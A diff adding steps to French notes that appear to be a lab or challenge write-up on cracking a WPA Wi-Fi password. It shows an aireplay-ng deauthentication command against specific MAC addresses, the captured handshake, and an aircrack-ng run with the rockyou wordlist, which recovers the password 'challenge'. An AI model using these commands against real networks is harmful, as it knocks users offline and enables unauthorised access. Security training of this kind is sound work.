@@ -41,4 +41,29 @@ Puis on écoute ce qui se passe sur le réseau:
 airodump-ng wlan0mon -w scan --manufacturer --wps -c6
 ```
 
-![[IMG-20260203233232883.png]]
+On oserve:
+![[IMG-20260203234805112.png]]
+
+On force à présent le user de se reconnecter au Wifi avec cette commande:
+```
+aireplay-ng -0 5 -a F0:9F:C2:A3:F1:A7  -c 28:6C:07:FE:A3:22  wlan0mon
+```
+
+Et on observe en haut de la premiere commande:
+```
+WPA handshake: F0:9F:C2:A3:F1:A7
+```
+
+![[IMG-20260203234855004.png]]
+
+Ensuite on utilise ce mdp pour cracker le mdp du wifi:
+```
+aircrack-ng -w /root/eaphammer/wordlists/rockyou.txt scan-03.cap
+```
+
+![[IMG-20260203235543981.png]]
+
+```
+Mdp: challenge
+```
+
